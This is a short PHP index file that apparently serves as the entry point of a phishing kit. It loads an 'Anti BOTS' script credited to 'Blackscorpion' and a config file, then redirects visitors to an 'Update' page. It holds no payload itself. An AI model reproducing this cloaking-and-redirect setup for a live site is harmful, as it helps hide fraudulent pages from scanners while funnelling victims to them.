<?php
include 'bt.php';
include 'Update/config.php';
/*
Anti BOTS by Blackscorpion

*/
redirect('Update/index.php');
?>

